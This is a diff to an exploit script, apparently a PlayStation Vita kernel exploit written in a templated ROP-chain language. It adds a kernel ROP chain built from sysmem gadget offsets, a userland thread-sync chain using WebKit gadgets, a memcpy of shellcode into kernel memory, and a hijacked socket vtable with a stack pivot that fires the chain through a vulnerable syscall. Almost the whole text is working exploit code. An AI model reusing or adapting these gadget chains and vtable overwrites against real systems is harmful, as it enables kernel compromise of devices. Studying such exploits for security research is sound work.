@@ -36,9 +36,15 @@ data
 	variable vptr;
 	buffer args_buf_first[0x10];
 	buffer args_buf_second[0x10];
+	buffer kernel_ropchain[0x100];
 
 	variable plant_thread_id;
 	variable plant_stack_base;
+
+	symbol stack_shellcode_offset = 0x200;
+	symbol sysmem_shellcode_offset = 0x27640;
+	symbol stack_rop_offset = 4;
+	symbol kstack_offset_to_data = 1784;
 }
 
 code : entry
@@ -56,10 +62,6 @@ code : entry
 	add([ioctl+0x3D4], -0x5747);
 	store(&return, sysmem_base);
 	PRINTF("sysmem base: 0x%x \n", [sysmem_base]);
-
-	add([sysmem_base], 0x1F819); // function retuns 0x41C
-	store(&return, our_data); // future function ptr
-
 
 #if 0
 	sceIoOpen("host0:stack.bin", 0x602, 6);
@@ -113,6 +115,16 @@ code : entry
 	store(0, user_ropchain + <%=i+=1%> * 4); // r4
 
 	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + <%=i+=1%> * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
+	store(1 * 1000 * 1000, user_ropchain + <%=i+=1%> * 4); // r0
+	store(0, user_ropchain + <%=i+=1%> * 4); // r1
+	store(0, user_ropchain + <%=i+=1%> * 4); // r2
+	store(0, user_ropchain + <%=i+=1%> * 4); // r3
+	store(sceKernelDelayThread, user_ropchain + <%=i+=1%> * 4); // r4
+	store(0, user_ropchain + <%=i+=1%> * 4); // r5
+	store(ASLR::SceWebKit + 0xfcdbb, user_ropchain + <%=i+=1%> * 4); // blx r4 ; pop {r4, pc} => delay to sync our two threads
+	store(0, user_ropchain + <%=i+=1%> * 4); // r4
+
+	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + <%=i+=1%> * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
 	store(device_name, user_ropchain + <%=i+=1%> * 4); // r0
 	store(5, user_ropchain + <%=i+=1%> * 4); // r1
 	store(our_data, user_ropchain + <%=i+=1%> * 4); // r2
@@ -134,20 +146,66 @@ code : entry
 	// plant thread end
 	sceKernelDelayThread(100 * 1000); // sleep 0.1s
 
+
 	add([ioctl+0x3C4], -0xABC);
 	store(&return, kernel_stack_base);
 	PRINTF("kernel stack: 0x%x (?)\n", [kernel_stack_base]);
+
+	// set up data for kernel
+	add([sysmem_base], 0x1e460); // ldm R0, {R4,R10,R12,SP,PC}
+	store(&return, our_data); // future function ptr
+
+	// layout: [ ldm_gadget ] [ kernel ropchain .... ] ... [ payload? ]
+	// remember: we only have 0x400 bytes, and the less we use the better
+
+	// kernel ropchain
+	// can do the define trick because preprocessor runs before erb
+	#define NEXT kernel_ropchain+4*<%=i+=1%>
+	#define STORE_OFFSET(off) \
+		add([sysmem_base], off); \
+		store(&return, NEXT)
+	#define STORE(addr) \
+		store(addr, NEXT)
+	<% i = -1 %>
+
+	STORE_OFFSET(0x2632f); // pop {r0, r1, r2, r3, r4, pc}
+	STORE_OFFSET(sysmem_shellcode_offset); // r0 => shellcode dst
+	add([kernel_stack_base], kstack_offset_to_data);
+	add(&return, stack_shellcode_offset);
+	STORE(&return); // r1 => shellcode src
+	STORE(0x100); // r2 => shellcode sz
+	STORE_OFFSET(0x23095); // r3 => dacr memcpy
+	STORE(0); // r4
+	STORE_OFFSET(0x39eb); // pc => blx r3 ; pop {r3, pc}
+	STORE(0); // r3
+	STORE_OFFSET(sysmem_shellcode_offset+1);
+
+	#undef NEXT
+	#undef STORE_OFFSET
+	#undef STORE
+
+	PRINTF("krop end\n");
+
+	// kernel ropchain end
+	memcpy(our_data + stack_rop_offset, kernel_ropchain, 0x100);
+
+	// set up shellcode
+	store(0xE7FE, our_data + stack_shellcode_offset);
+
+	// after the plant thread wakes up, it should copy our_data into kernel stack
+
 
 	// trigger rootkit
 	// sceIoClose(0xb00b5);
 
 	// set up overwritten socket structure
-	// add([sysmem_base], 0x25eb8); // 0x25ED4 - 28);
-	// store(&return, vptr);
-	// PRINTF("got offset 0x%x\n", [vptr]);
-	//store([vptr], mybuf + 0x18); // vptr
 	add([kernel_stack_base], 1756);
-	store(&return, mybuf + 0x18); // vptr
+	store(&return, mybuf + 6 * 4); // vptr
+	add([kernel_stack_base], kstack_offset_to_data);
+	add(&return, stack_rop_offset);
+	store(&return, mybuf + 3 * 4); // sp
+	add([sysmem_base], 0x347); // pop {pc} to kick off the ropchain
+	store(&return, mybuf + 4 * 4);
 	PRINTF("hacked vtable at 0x%x\n", [mybuf + 0x18]);
 
 	// create and set up rop thread that will call vulnerable syscall
@@ -241,7 +299,7 @@ code : entry
 	sceKernelStartThread([rop_thread_id], 7 * 4, ldm_buf); // it should hang
 	PRINTF("start user rop thread 0x%x\n", &return);
 
-	sceKernelDelayThread(1*1000*1000);
+	sceKernelDelayThread(1500*1000);
 	// free sockets
 	<% (0..need_sockets-1).step(2) do |socket_id| %>
 	sceNetSyscallClose([sockets + <%= 4 * socket_id %>]);
